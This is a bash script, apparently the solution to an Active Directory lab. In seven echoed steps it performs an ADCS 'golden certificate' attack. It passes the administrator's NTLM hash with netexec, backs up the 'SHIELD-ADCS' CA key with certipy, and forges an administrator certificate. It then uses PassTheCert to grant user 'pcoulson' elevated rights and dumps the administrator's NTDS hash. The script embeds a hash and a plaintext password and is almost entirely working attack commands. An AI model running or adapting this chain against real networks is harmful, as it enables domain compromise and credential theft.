#!/bin/bash

# Colors
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}Step: 1 - netexec smb 192.168.115.181 -u administrator -H :70719ceea9cd82e56b744447952fbf68 --local-auth${NC}"
echo
netexec smb 192.168.115.181 -u administrator -H :70719ceea9cd82e56b744447952fbf68 --local-auth

echo
echo -e "${BLUE}Step: 2 - certipy ca -backup -u 'Administrator' -hashes :70719ceea9cd82e56b744447952fbf68 -ca 'SHIELD-ADCS' -debug -target 192.168.115.181${NC}"
echo
certipy ca -backup -u 'Administrator' -hashes :70719ceea9cd82e56b744447952fbf68 -ca 'SHIELD-ADCS' -debug -target 192.168.115.181

echo
echo -e "${BLUE}Step: 3 - certipy forge -ca-pfx 'SHIELD-ADCS.pfx' -upn administrator@shield.local${NC}"
echo
certipy forge -ca-pfx 'SHIELD-ADCS.pfx' -upn administrator@shield.local

echo
echo -e "${BLUE}Step: 4 - certipy cert -pfx administrator_forged.pfx -nokey -out administrator.crt${NC}"
echo
certipy cert -pfx administrator_forged.pfx -nokey -out administrator.crt

echo
echo -e "${BLUE}Step: 5 - certipy cert -pfx administrator_forged.pfx -nocert -out administrator.key${NC}"
echo
certipy cert -pfx administrator_forged.pfx -nocert -out administrator.key

echo
echo -e "${BLUE}Step: 6 - python3 /opt/PassTheCert/Python/passthecert.py -action modify_user -crt administrator.crt -key administrator.key -target pcoulson -elevate -domain shield.local -dc-host dc4.shield.local${NC}"
echo

python3 /opt/PassTheCert/Python/passthecert.py -action modify_user -crt administrator.crt -key administrator.key -target pcoulson -elevate -domain shield.local -dc-host dc4.shield.local

echo
echo -e "${BLUE}Step: 7 - netexec smb 192.168.115.180 -u pcoulson -p P4ssw0rd123456@ --ntds --user administrator${NC}"
echo
netexec smb 192.168.115.180 -u pcoulson -p P4ssw0rd123456@ --ntds --user administrator

echo